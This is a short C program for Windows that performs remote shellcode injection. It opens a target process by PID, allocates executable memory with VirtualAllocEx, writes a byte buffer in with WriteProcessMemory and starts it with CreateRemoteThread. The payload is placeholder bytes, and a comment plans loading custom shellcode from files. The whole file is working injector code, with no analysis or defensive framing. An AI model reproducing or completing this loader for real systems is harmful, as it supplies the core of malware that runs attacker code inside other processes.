#include <stdio.h>
#include <Windows.h>


int main(int argc, char* argv[]) {
	/// Setup the handles...

	HANDLE procHandle;
	HANDLE rmteThread;
	PVOID rmteBuffer;


	/// Process ID
	DWORD pid;

	/// Test shellcode untill we add a way to load custom from bins... 
	unsigned char steamedHams[] = "\x41\x41\x41\x41\x41\x41";
	size_t hamsToSteam = sizeof(steamedHams);

	if (argc < 2) {
		printf("[!] usage: %s pid", argv[0]);
		return EXIT_FAILURE;
	}

	pid = atoi(argv[1]);

	printf("[*] getting a handle to the process (%ld)\n", pid);
	
	/// Handle error checking...
	
	procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	
	if ( procHandle == NULL) {
		printf("[!] error getting handle to process!");
	}

	/// Alloc memory to the proccess...and then write it
	printf("[*] Allocating memory within the process..."); 
	rmteBuffer = VirtualAllocEx(procHandle, NULL, hamsToSteam, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	printf(" [*] Allocated %zd-bytes to memory\n", hamsToSteam);

	WriteProcessMemory(procHandle, rmteBuffer, steamedHams, hamsToSteam, NULL);
	

	/// Create our thread
	rmteThread = CreateRemoteThread(procHandle, NULL, 0, (LPTHREAD_START_ROUTINE)rmteBuffer, NULL, 0, NULL);
	CloseHandle(procHandle);
	WaitForSingleObject(rmteThread, INFINITE);

}

